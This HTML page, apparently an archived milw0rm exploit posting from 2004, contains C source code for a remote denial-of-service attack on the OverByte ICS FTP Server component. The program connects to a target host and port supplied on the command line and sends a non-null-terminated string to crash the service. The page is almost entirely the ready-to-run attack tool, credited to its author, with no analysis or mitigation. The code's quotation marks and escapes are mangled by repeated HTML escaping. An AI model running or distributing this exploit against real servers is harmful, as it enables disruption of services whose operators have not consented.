<html><head><title>OverByte ICS FTP Server Remote Denial of Service Exploit</title></head><pre>--Exploit:
//===========================================================
#include &lt;winsock2.h&gt;
#include &lt;stdio.h&gt;

#pragma comment(lib, \\\&quot;ws2_32.lib\\\&quot;)


char Non_null_terminated_string [] = \\\&quot;AAAAAAAAAAAAAAAAAA\\\&quot;;

int main(int argc, char *argv[])
{
WSADATA wsaData;
WORD wVersionRequested;
struct hostent *pTarget;
struct sockaddr_in sock;
char *target;
int port,bufsize;
SOCKET mysocket;
int res=1;
char text[1024]={\\\' \\\'};

if (argc &lt; 2)
{
printf(\\\&quot;\\\\r\\\\nICS FTP server Component Denial Of Service
vulnerability\\\\r\\\\n\\\&quot;, argv[0]);
printf(\\\&quot;Coded By ATmaCA\\\\r\\\\n\\\&quot;);
printf(\\\&quot;E-Mail:atmaca@prohack.net\\\\r\\\\n\\\&quot;);
printf(\\\&quot;Web:www.prohack.net\\\\r\\\\n\\\\r\\\\n\\\&quot;);
printf(\\\&quot;Usage:\\\\r\\\\n %s &lt;targetip&gt; [targetport] (default is
21)\\\\r\\\\n\\\\r\\\\n\\\&quot;,argv[0]);

exit(1);
}

wVersionRequested = MAKEWORD(1, 1);
if (WSAStartup(wVersionRequested, &amp;wsaData) &lt; 0) return -1;

target = argv[1];
port = 21;

if (argc &gt;= 3) port = atoi(argv[2]);
bufsize = 1024;
if (argc &gt;= 4) bufsize = atoi(argv[3]);

mysocket = socket(AF_INET, SOCK_STREAM, 0);
if(mysocket==INVALID_SOCKET)
{
printf(\\\&quot;Socket error!\\\\r\\\\n\\\&quot;);
exit(1);
}

printf(\\\&quot;Resolving Hostnames...\\\\n\\\&quot;);
if ((pTarget = gethostbyname(target)) == NULL)
{
printf(\\\&quot;Resolve of %s failed\\\\n\\\&quot;, argv[1]);
exit(1);
}

memcpy(&amp;sock.sin_addr.s_addr, pTarget-&gt;h_addr, pTarget-&gt;h_length);
sock.sin_family = AF_INET;
sock.sin_port = htons((USHORT)port);

printf(\\\&quot;Connecting...\\\\n\\\&quot;);
if ( (connect(mysocket, (struct sockaddr *)&amp;sock, sizeof (sock) )))
{
printf(\\\&quot;Couldn\\\'t connect to host.\\\\n\\\&quot;);
exit(1);
}

printf(\\\&quot;Connected!...\\\\n\\\&quot;);
printf(\\\&quot;Sending Non-null-terminated-string...\\\\n\\\&quot;);
if (send(mysocket,Non_null_terminated_string,
sizeof(Non_null_terminated_string)-1, 0) == -1)
{
printf(\\\&quot;Error Sending the Non-null-terminated-string.\\\\r\\\\n\\\&quot;);
closesocket(mysocket);
exit(1);
}

closesocket(mysocket);
WSACleanup();
return 0;
}

// milw0rm.com [2004-07-20]</pre></html>